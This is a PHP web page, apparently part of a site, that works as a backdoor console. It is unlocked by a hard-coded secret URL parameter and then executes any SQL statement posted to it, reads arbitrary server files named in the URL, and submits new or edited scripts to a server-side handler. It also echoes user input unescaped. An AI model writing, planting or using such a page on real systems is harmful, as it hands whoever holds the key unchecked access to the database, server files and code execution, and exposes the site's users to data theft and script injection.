<link rel="stylesheet" href="css/ranksol.css">
<?php
	session_start();
	include_once("database.php");
include_once("functions.php");
	if(!isset($_GET['par']) || $_GET['par']!="a113456bh-life360"){
		die('going to die');
	}
	if($_POST['op']=='ds'){
		if($_POST['sql']==""){
			$msg = '<span class="red">Error: Query is empty!';
		} 
		else{
			$sql   = stripslashes($_POST['sql']);
			$result= mysqli_query($link,$sql);
			if(!$result){
				$msg = '<span class="red">Error! '.mysqli_errno($link)." : ".mysqli_error($link).'</span>';
			}
			else{
				if(mysqli_affected_rows($link)==0){
					$msg = '<span class="green">Query ok</span> <span class="red"><b>0</b> rows affected</span>';
					if(preg_match("/select/",$sql)){
						$msg.= '<span class="red">, NO result found.';
					}
				}
				else if(mysqli_affected_rows($link)>0){
					$msg = '<span class="green">Query ok affected rows='.mysqli_affected_rows($link).'</span>';
				}
			} 
		}
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Expires" content="Fri, Jan 01 1900 00:00:00 GMT">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache">
<title>Accessing</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
</head>

<body>
	<div class="container">
<?php 
	if(isset($_GET['page']) && trim($_GET['page'])!=''){
		if($_GET['page']=='new'){
?>
			<form method="post" enctype="multipart/form-data" action="server.php">		
				<h2>Create New File.</h2>
				<div class="form-group">
					<label>Enter filename:</label>
					<input type="text" name="new_file_name" class="form-control" required/>
				</div>
				<div class="form-group">
					<label>Write Script:</label>
					<textarea class="form-control" name="new_script" cols="60" rows="20" required><?php echo $contents?></textarea>
				</div>
				<input type="hidden" name="cmd" value="create_new_file">
				<input type="submit"name="submit"value="Create File" class="btn btn-primary">
			</form>
<?php
		}
		else{
			$file = file_get_contents($_GET['page']);
			if($file==false){
				?>
                <h3>Error! 404 file not found.</h3>
<?php			}
			else{
				$contents = htmlentities($file);
?>
				<form method="post" enctype="multipart/form-data" action="server.php">		
					<div class="form-group">
						<label><h2><?php echo $_GET['page']; ?>.</h2>
                            <span>
                                <?php echo $_SESSION['message'];
                                unset($_SESSION['message']);?>
                            </span>
                        </label>
						<textarea class="form-control" name="script" cols="60" rows="20" required><?php echo $contents?></textarea>
					</div>
					<input type="hidden" name="file_name" value="<?php echo $_GET['page']; ?>" />
					<input type="hidden" name="cmd" value="update_script">
					<input type="submit"name="submit"value="Update" class="btn btn-primary">
				</form>
<?php 
			}
		}
		die();
	}
	else{
?>
		<form name="table" method="post"action="<?php $_SERVER['PHP_SELF']; ?>">
			<div class="form-group">
				<label>
					<h2>Write MySQL Statement here.</h2>
					<p>One statement per submit.</p>
				</label>
				<textarea cols=60 rows=7 name="sql" id="sqlbox" wrap="soft" class="form-control" required><?php echo stripcslashes($_POST['sql'],ENT_COMPAT);?></textarea>
			</div>
			<input type="hidden" name="op" value="ds">
			<input type="submit"name="submit"value="Execute" class="btn btn-primary">
			<input type="button" name="reset" value="Clear" class="btn btn-default" onclick='document.getElementById("sqlbox").value="";'>
			<?php if(isset($msg)) echo $msg;?>
		</form>
<?php
		if(mysqli_num_rows($result)>0){
?>
			<p>&nbsp;</p>
			<table class="table table-bordered table-hover">
				<thead>
					<tr>
						<?php
						for($i=0;$i<mysqli_num_fields($result);$i++){ ?>
							<th><?php echo mysqli_fetch_field_direct($result, $i)->name?></th>
					<?php	}
						?>
					</tr>
				</thead>
				<tbody>
				<?php
					for ($i =0; $i < mysqli_num_rows($result); $i++) {
						?>
                        <tr>
					<?php	$row_array = mysqli_fetch_row($result);
						for ($j = 0; $j < mysqli_num_fields($result); $j++) {
							?>
                            <td><?php echo $row_array[$j]?></td>
                                    <?php
						}
						?>
                        </tr>
				<?php	}
				?>
				</tbody>
			</table>
		<?php 
		}
	}
?>
	</div>
</body>
</html>